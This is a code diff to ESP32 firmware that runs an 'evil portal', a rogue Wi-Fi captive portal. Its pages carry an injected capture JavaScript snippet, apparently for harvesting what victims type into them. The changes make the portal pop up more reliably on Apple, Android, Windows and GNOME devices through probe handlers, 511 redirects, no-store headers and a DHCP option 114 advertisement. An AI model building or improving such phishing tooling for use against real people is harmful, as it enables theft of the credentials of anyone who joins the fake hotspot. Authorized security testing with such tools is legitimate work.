@@ -987,6 +987,7 @@ esp_err_t portal_handler(httpd_req_t *req) {
         httpd_resp_set_hdr(req, "Transfer-Encoding", "chunked"); // Set chunked response
         httpd_resp_send_chunk(req, html_buffer, html_buffer_size);
         httpd_resp_send_chunk(req, CAPTURE_JS_SNIPPET, strlen(CAPTURE_JS_SNIPPET));
+        httpd_resp_send_chunk(req, NULL, 0);
         ESP_LOGI(TAG, "Served HTML from buffer (size: %zu bytes) with JS injection.", html_buffer_size);
         ESP_LOGI(TAG, "Free heap after serving buffer: %" PRIu32 " bytes", esp_get_free_heap_size());
         return ESP_OK;
@@ -998,6 +999,7 @@ esp_err_t portal_handler(httpd_req_t *req) {
         httpd_resp_set_hdr(req, "Transfer-Encoding", "chunked");
         httpd_resp_send_chunk(req, default_portal_html, strlen(default_portal_html));
         httpd_resp_send_chunk(req, CAPTURE_JS_SNIPPET, strlen(CAPTURE_JS_SNIPPET));
+        httpd_resp_send_chunk(req, NULL, 0);
         ESP_LOGI(TAG, "Served default embedded portal with JS injection.");
         ESP_LOGI(TAG, "Free heap after serving default portal: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
         return ESP_OK;
@@ -1096,7 +1098,26 @@ esp_err_t get_info_handler(httpd_req_t *req) {
 
 esp_err_t captive_portal_redirect_handler(httpd_req_t *req) {
     ESP_LOGI(TAG, "Free heap at redirect handler entry: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
+    // Log Host header and User-Agent for diagnostics (help debug iOS probe behavior)
+    const char *req_host = get_host_from_req(req);
+    if (req_host) {
+        ESP_LOGI(TAG, "Redirect handler Host header: %s", req_host);
+        free((void*)req_host);
+    } else {
+        ESP_LOGI(TAG, "Redirect handler: Host header not present");
+    }
+    size_t ua_len = httpd_req_get_hdr_value_len(req, "User-Agent") + 1;
+    if (ua_len > 1) {
+        char *ua = malloc(ua_len);
+        if (ua) {
+            if (httpd_req_get_hdr_value_str(req, "User-Agent", ua, ua_len) == ESP_OK) {
+                ESP_LOGI(TAG, "Redirect handler User-Agent: %s", ua);
+            }
+            free(ua);
+        }
+    }
     if (login_done) {
+        httpd_resp_set_hdr(req, "Cache-Control", "no-store");
         httpd_resp_set_status(req, "204 No Content");
         httpd_resp_send(req, NULL, 0);
         return ESP_OK;
@@ -1105,15 +1126,16 @@ esp_err_t captive_portal_redirect_handler(httpd_req_t *req) {
     if (
         strcmp(uri, "/generate_204") == 0 ||
         strcmp(uri, "/gen_204") == 0 ||
-        strcmp(uri, "/hotspot-detect.html") == 0 ||
         strcmp(uri, "/connecttest.txt") == 0 ||
         strcmp(uri, "/ncsi.txt") == 0 ||
+        strcmp(uri, "/check_network_status.txt") == 0 ||
         strcmp(uri, "/success.txt") == 0 ||
         strcmp(uri, "/library/test/success.html") == 0 ||
         strcmp(uri, "/success.html") == 0 ||
         strcmp(uri, "/") == 0 ||
         strcmp(uri, "/redirect") == 0
     ) {
+        httpd_resp_set_hdr(req, "Cache-Control", "no-store");
         esp_err_t r = portal_handler(req);
         ESP_LOGI(TAG, "Free heap at redirect handler exit: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
         return r;
@@ -1125,21 +1147,37 @@ esp_err_t captive_portal_redirect_handler(httpd_req_t *req) {
         return ESP_OK;
     }
 
-    if (strstr(get_content_type(req->uri), "application/octet-stream") == NULL) {
+    const char *u = req->uri;
+    size_t ulen = strlen(u);
+    if ((ulen >= 4 && (strcmp(u + ulen - 4, ".png") == 0 || strcmp(u + ulen - 4, ".jpg") == 0 || strcmp(u + ulen - 4, ".css") == 0 || strcmp(u + ulen - 3, ".js") == 0)) ||
+        (ulen >= 5 && strcmp(u + ulen - 5, ".html") == 0)) {
         file_handler(req);
         return ESP_OK;
     }
 
-    httpd_resp_set_status(req, "302 Found");
-    char LocationRedir[512];
-    snprintf(LocationRedir, sizeof(LocationRedir), "http://192.168.4.1/login");
-    httpd_resp_set_hdr(req, "Location", LocationRedir);
+    httpd_resp_set_hdr(req, "Cache-Control", "no-store");
+    httpd_resp_set_status(req, "511 Network Authentication Required");
+    httpd_resp_set_hdr(req, "Location", "http://192.168.4.1/login");
     httpd_resp_send(req, NULL, 0);
     ESP_LOGI(TAG, "Free heap at redirect handler exit: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
     return ESP_OK;
 }
 
+static esp_err_t apple_probe_handler(httpd_req_t *req) {
+    httpd_resp_set_hdr(req, "Cache-Control", "no-store");
+    if (login_done) {
+        httpd_resp_set_status(req, "200 OK");
+        httpd_resp_set_type(req, "text/html");
+        const char *success_response = "<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>";
+        httpd_resp_send(req, success_response, strlen(success_response));
+        return ESP_OK;
+    } else {
+        return portal_handler(req);
+    }
+}
+
 static esp_err_t captive_portal_head_ok_handler(httpd_req_t *req) {
+    httpd_resp_set_hdr(req, "Cache-Control", "no-store");
     if (login_done) {
         httpd_resp_set_status(req, "204 No Content");
     } else {
@@ -1163,7 +1201,7 @@ httpd_handle_t start_portal_webserver(void) {
         httpd_uri_t portal_android_head = {.uri = "/generate_204", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
         httpd_uri_t portal_android_gen_get = {.uri = "/gen_204", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
         httpd_uri_t portal_android_gen_head = {.uri = "/gen_204", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
-        httpd_uri_t portal_apple_get = {.uri = "/hotspot-detect.html", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
+        httpd_uri_t portal_apple_get = {.uri = "/hotspot-detect.html", .method = HTTP_GET, .handler = apple_probe_handler, .user_ctx = NULL};
         httpd_uri_t portal_apple_head = {.uri = "/hotspot-detect.html", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
         httpd_uri_t portal_root_get = {.uri = "/", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
         httpd_uri_t portal_root_head = {.uri = "/", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
@@ -1171,6 +1209,8 @@ httpd_handle_t start_portal_webserver(void) {
         httpd_uri_t microsoft_head = {.uri = "/connecttest.txt", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
         httpd_uri_t ncsi_get = {.uri = "/ncsi.txt", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
         httpd_uri_t ncsi_head = {.uri = "/ncsi.txt", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
+        httpd_uri_t gnome_get = {.uri = "/check_network_status.txt", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
+        httpd_uri_t gnome_head = {.uri = "/check_network_status.txt", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
         httpd_uri_t success_get = {.uri = "/success.txt", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
         httpd_uri_t success_head = {.uri = "/success.txt", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
         httpd_uri_t lib_success_get = {.uri = "/library/test/success.html", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
@@ -1203,6 +1243,8 @@ httpd_handle_t start_portal_webserver(void) {
         httpd_register_uri_handler(evilportal_server, &microsoft_head);
         httpd_register_uri_handler(evilportal_server, &ncsi_get);
         httpd_register_uri_handler(evilportal_server, &ncsi_head);
+        httpd_register_uri_handler(evilportal_server, &gnome_get);
+        httpd_register_uri_handler(evilportal_server, &gnome_head);
         httpd_register_uri_handler(evilportal_server, &success_get);
         httpd_register_uri_handler(evilportal_server, &success_head);
         httpd_register_uri_handler(evilportal_server, &lib_success_get);
@@ -1278,6 +1320,22 @@ esp_err_t wifi_manager_start_evil_portal(const char *URLorFilePath, const char *
         // Handle invalid or too long paths by defaulting to internal portal as a fallback
         ESP_LOGW(TAG, "Invalid or too long URL/FilePath provided, defaulting to internal portal.");
         strcpy(PORTALURL, "INTERNAL_DEFAULT_PORTAL");
+    }
+
+    // Advertise Captive Portal API URI via DHCP (RFC 8910 / option 114) if available.
+    if (strlen(PORTALURL) > 0) {
+        esp_err_t rc = esp_netif_dhcps_option(wifiAP, ESP_NETIF_OP_SET, ESP_NETIF_CAPTIVEPORTAL_URI, (void *)PORTALURL, (uint32_t)(strlen(PORTALURL) + 1));
+        if (rc == ESP_ERR_ESP_NETIF_DHCP_ALREADY_STARTED) {
+            // DHCP server already running; restart it to apply the option
+            esp_netif_dhcps_stop(wifiAP);
+            rc = esp_netif_dhcps_option(wifiAP, ESP_NETIF_OP_SET, ESP_NETIF_CAPTIVEPORTAL_URI, (void *)PORTALURL, (uint32_t)(strlen(PORTALURL) + 1));
+            esp_netif_dhcps_start(wifiAP);
+        }
+        if (rc != ESP_OK) {
+            printf("Failed to set captive portal DHCP option: %s\n", esp_err_to_name(rc));
+        } else {
+            printf("Advertised captive portal URI via DHCP: %s\n", PORTALURL);
+        }
     }
 
     // Domain is fetched from settings in commandline.c, just copy it if provided
